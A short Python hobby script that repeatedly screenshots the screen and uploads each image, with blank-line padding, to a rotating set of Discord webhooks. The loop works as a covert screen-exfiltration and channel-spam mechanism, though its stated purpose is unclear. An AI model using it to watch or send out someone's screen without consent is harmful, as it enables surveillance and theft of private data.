#lmao why did I make this

import pyautogui
import time
import discord
from discord_webhook import DiscordWebhook
import threading

assad = {
  #10 webhooks here
  #in total or it wont work smoothly
       }

def sendwebhook(url):
    webhook = DiscordWebhook(url=url, content='.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.')
    with open("screen.png", "rb") as f:
        webhook.add_file(file=f.read(), filename='screen.png')
    response = webhook.execute()

while True:
    for links in assad:
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")
        t1 = threading.Thread(target=sendwebhook, args=(links,))
        t1.start()
        time.sleep(2)
       
